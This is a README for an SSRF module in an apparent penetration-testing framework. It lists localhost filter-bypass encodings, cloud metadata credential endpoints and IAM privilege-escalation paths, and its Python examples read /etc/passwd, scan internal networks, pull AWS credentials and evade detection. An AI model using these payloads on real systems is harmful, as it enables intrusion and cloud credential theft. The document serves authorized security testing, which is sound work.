# SSRF Module

## Overview

The SSRF (Server-Side Request Forgery) module provides comprehensive testing capabilities for identifying and exploiting SSRF vulnerabilities in web applications. It includes advanced filter bypass techniques, cloud metadata exploitation, and internal network scanning.

## Features

### 1. SSRF Detection Techniques

- **Direct SSRF**: Tests for SSRF with visible responses
- **Time-based Blind SSRF**: Detects SSRF through response timing analysis
- **OOB Blind SSRF**: Uses out-of-band callbacks for blind SSRF detection

### 2. Filter Bypass Techniques

The module implements multiple bypass techniques to evade common SSRF filters:

- **IPv6 Localhost**: `[::1]`, `[0:0:0:0:0:0:0:1]`, `[::ffff:127.0.0.1]`
- **IP Encoding**: Decimal (2130706433), Hex (0x7f000001), Octal (0177.0.0.1)
- **Short IP Forms**: `127.1`, `127.0.1`
- **URL Encoding**: Single and double URL encoding
- **DNS Rebinding**: Using services like `localtest.me`, `nip.io`, `xip.io`
- **Case Variation**: `LOCALHOST`, `LocalHost`
- **Unicode/IDN**: Unicode character variations

### 3. Cloud Metadata Exploitation

Automatically tests access to cloud metadata services:

#### AWS
- Instance metadata: `http://169.254.169.254/latest/meta-data/`
- User data: `http://169.254.169.254/latest/user-data/`
- IAM credentials: `http://169.254.169.254/latest/meta-data/iam/security-credentials/`

#### Azure
- Instance metadata: `http://169.254.169.254/metadata/instance?api-version=2021-02-01`
- OAuth tokens: `http://169.254.169.254/metadata/identity/oauth2/token`

#### GCP
- Metadata: `http://metadata.google.internal/computeMetadata/v1/`
- Service account tokens: `http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token`

#### Other Providers
- DigitalOcean
- Alibaba Cloud

### 4. Internal Port Scanning

Enumerate accessible internal ports via SSRF:

- Common ports: FTP (21), SSH (22), HTTP (80), MySQL (3306), Redis (6379), etc.
- Service identification from response patterns
- Banner grabbing for service fingerprinting

### 5. Cloud Resource Enumeration

After obtaining cloud credentials:

- Enumerate S3 buckets, Azure Blob containers, GCS buckets
- List EC2 instances, Azure VMs, GCP compute instances
- Identify databases and other cloud resources

### 6. IAM Privilege Escalation Testing

Test for common privilege escalation paths:

- AWS: `iam:CreateAccessKey`, `iam:AttachUserPolicy`, `lambda:UpdateFunctionCode`
- Azure: Role assignment permissions, VM extension writes
- GCP: Service account key creation, role updates

## Usage Examples

### Basic SSRF Testing

```python
from app.modules.ssrf import SSRFTester, InjectionPoint
from app.core.request_handler import RequestHandler

# Initialize
request_handler = RequestHandler()
tester = SSRFTester(request_handler)

# Define injection point
injection_point = InjectionPoint(
    parameter="url",
    location="query",
    original_value="https://example.com",
    url="http://target.com/fetch",
    method="GET",
)

# Test for SSRF
results = await tester.test_injection_point(injection_point)

for result in results:
    if result.is_vulnerable:
        print(f"SSRF found! Type: {result.ssrf_type.value}")
        print(f"Bypass technique: {result.bypass_technique}")
        print(f"Confidence: {result.confidence}")
```

### Internal Port Scanning

```python
# After confirming SSRF vulnerability
port_results = await tester.scan_internal_ports(
    injection_point,
    target_host="127.0.0.1",
    ports=[80, 443, 3306, 6379, 8080],
)

for port_result in port_results:
    if port_result.is_open:
        print(f"Port {port_result.port} is open")
        print(f"Service: {port_result.service}")
        print(f"Banner: {port_result.banner}")
```

### Cloud Metadata Testing

```python
from app.modules.ssrf import CloudProvider

# Test all cloud providers
cloud_results = await tester.test_cloud_metadata(
    injection_point,
    providers=[CloudProvider.AWS, CloudProvider.AZURE, CloudProvider.GCP],
)

for result in cloud_results:
    if result.accessible:
        print(f"Cloud metadata accessible: {result.provider.value}")
        print(f"Endpoint: {result.endpoint}")
        if result.credentials:
            print(f"Credentials found: {result.credentials}")
```

### Cloud Resource Enumeration

```python
# After obtaining cloud credentials
if cloud_result.credentials:
    resources = await tester.enumerate_cloud_resources(
        injection_point,
        cloud_result.provider,
        cloud_result.credentials,
    )
    
    print(f"Accessible resources: {resources}")
```

### Using the SSRF Exploiter

```python
from app.modules.ssrf import SSRFExploiter

# Create exploiter for confirmed SSRF
exploiter = SSRFExploiter(
    request_handler,
    injection_point,
    ssrf_result,
)

# Read local files
file_content = await exploiter.read_file("/etc/passwd")
print(file_content)

# Scan internal network
scan_results = await exploiter.scan_network(
    "192.168.1.0/24",
    ports=[80, 443, 22],
)

# Exploit cloud metadata
cloud_data = await exploiter.exploit_cloud(CloudProvider.AWS)
if cloud_data and cloud_data.credentials:
    print(f"AWS credentials obtained: {cloud_data.credentials}")
```

### With OOB Listener

```python
from app.core.oob_listener import OOBListener

# Initialize with OOB listener for blind SSRF
oob_listener = OOBListener()
await oob_listener.start()

tester = SSRFTester(request_handler, oob_listener=oob_listener)

# Test will automatically use OOB callbacks
results = await tester.test_injection_point(injection_point)
```

## Data Models

### InjectionPoint
- `parameter`: Parameter name to inject into
- `location`: Where to inject (query, post, header, cookie)
- `original_value`: Original parameter value
- `url`: Target URL
- `method`: HTTP method
- `headers`: Custom headers
- `data`: POST data

### SSRFResult
- `injection_point`: The tested injection point
- `is_vulnerable`: Whether SSRF was found
- `ssrf_type`: Type of SSRF (direct, blind_time, blind_oob)
- `target_url`: URL that was successfully accessed
- `payload`: The payload that triggered SSRF
- `confidence`: Confidence score (0.0-1.0)
- `response_data`: Response data from SSRF
- `bypass_technique`: Bypass technique used
- `evidence`: List of evidence strings

### CloudMetadataResult
- `provider`: Cloud provider (AWS, Azure, GCP, etc.)
- `endpoint`: Metadata endpoint accessed
- `accessible`: Whether endpoint was accessible
- `data`: Metadata response data
- `credentials`: Extracted credentials
- `resources`: List of accessible resources

### PortScanResult
- `host`: Target host
- `port`: Port number
- `is_open`: Whether port is open
- `service`: Identified service name
- `response_time`: Response time
- `banner`: Service banner

## Requirements Validation

This module validates the following requirements:

- **Requirement 8.1**: Tests localhost and internal IP ranges with multiple encoding schemes
- **Requirement 8.2**: Applies multiple bypass techniques including IPv6, encoding, DNS rebinding
- **Requirement 8.3**: Tests cloud metadata endpoints for AWS, Azure, and GCP
- **Requirement 8.4**: Enumerates accessible ports via SSRF and logs responding services
- **Requirement 40.1**: Automatically attempts to access cloud metadata services
- **Requirement 40.2**: Enumerates accessible cloud resources
- **Requirement 40.3**: Tests cloud storage (S3, Azure Blob, GCS)
- **Requirement 40.4**: Tests for privilege escalation via IAM
- **Requirement 40.5**: Provides one-click exploitation for cloud misconfigurations

## Security Considerations

This module is designed for:
- Authorized penetration testing
- CTF competitions
- Security research in controlled environments
- Bug bounty programs with proper authorization

**Never use this module against systems without explicit permission.**

## Integration with Other Modules

The SSRF module integrates with:

- **Request Handler**: For HTTP communication
- **OOB Listener**: For blind SSRF detection
- **Payload Engine**: For payload management
- **Session Manager**: For maintaining authenticated sessions
- **Logger**: For comprehensive logging of all attempts

## Performance Considerations

- Port scanning includes delays to avoid overwhelming targets
- Cloud metadata testing is rate-limited
- Concurrent requests are controlled to prevent detection
- Timeouts are configured appropriately for different test types

## Future Enhancements

Potential improvements:
- Support for more cloud providers
- Advanced IAM privilege escalation chains
- Kubernetes metadata service support
- Docker socket exploitation
- SSRF to XXE chaining
- Automated exploitation of discovered services
